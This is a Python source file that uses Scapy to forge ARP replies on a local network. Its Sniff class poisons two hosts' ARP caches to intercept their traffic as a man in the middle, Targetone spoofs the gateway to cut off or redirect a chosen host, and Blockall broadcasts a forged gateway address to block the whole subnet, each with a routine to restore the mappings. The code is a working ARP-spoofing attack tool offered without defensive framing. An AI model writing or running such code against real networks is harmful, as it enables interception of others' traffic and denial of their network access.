from scapy.all import ARP, send, getmacbyip, conf
from configparser import ConfigParser

config = ConfigParser()
config.read("./config.ini")
TrapMAC = config['LIB']['trapmac']


class Sniff():

    def __init__(self, target1, target2) -> None:
        self.target1 = target1
        self.target2 = target2
    
    def start(self):
        T1mac = getmacbyip(self.target1)
        T2mac = getmacbyip(self.target2)
        T2pac = ARP(pdst=self.target1, hwdst=T1mac, psrc=self.target2, op=2)
        T1pac = ARP(pdst=self.target2, hwdst=T2mac, psrc=self.target1, op=2)
        send(T1pac, verbose=False)
        send(T2pac, verbose=False)

    def stop(self):
        T1mac = getmacbyip(self.target1)
        T2mac = getmacbyip(self.target2)
        T1pac = ARP(pdst=self.target1, hwdst=T1mac, psrc=self.target2, hwsrc=T2mac, op=2)
        T2pac = ARP(pdst=self.target2, hwdst=T2mac, psrc=self.target1, hwsrc=T1mac, op=2)
        send(T1pac, verbose=False)
        send(T2pac, verbose=False)


class Targetone():
    
    def __init__(self) -> None:
        pass

    def add(ip, mac):
        target_mac = getmacbyip(ip)
        if not target_mac:
            print(f"Impossible de résoudre l'adresse MAC pour {ip}. Abandon de l'envoi du paquet.")
            return

        gateway = str(conf.route.route("0.0.0.0")[2])
        Tpacket = ARP(pdst=ip, hwdst=mac, psrc=gateway, hwsrc=TrapMAC, op=2)

        Gmac = getmacbyip(gateway)
        Gpacket = ARP(pdst=gateway, hwdst=Gmac, psrc=ip, hwsrc=TrapMAC, op=2)

        send(Tpacket, verbose=False)
        send(Gpacket, verbose=False)

    def remove(ip, mac):
        gateway = str(conf.route.route("0.0.0.0")[2])
        Gmac = getmacbyip(gateway)
        packet = ARP(pdst=ip, hwdst=mac, psrc=gateway, hwsrc=Gmac, op=2)
        send(packet, verbose=False)


class Blockall():
    
    def __init__(self) -> None:
        self.threads = {}
    
    def start():
        gateway = str(conf.route.route("0.0.0.0")[2])
        gOctets = gateway.split('.')
        broadcast = '.'.join(gOctets[:3])
        broadcast = f'{broadcast}.255'
        packet = ARP(pdst=broadcast, hwdst='ff:ff:ff:ff:ff:ff', psrc=gateway, hwsrc=TrapMAC, op=2)
        send(packet, verbose=False)

    def stop():
        gateway = str(conf.route.route("0.0.0.0")[2])
        Gmac = getmacbyip(gateway)
        gOctets = gateway.split('.')
        broadcast = '.'.join(gOctets[:3])
        broadcast = f'{broadcast}.255'
        packet = ARP(pdst=broadcast, hwdst='ff:ff:ff:ff:ff:ff', psrc=gateway, hwsrc=Gmac, op=2)
        send(packet, verbose=False)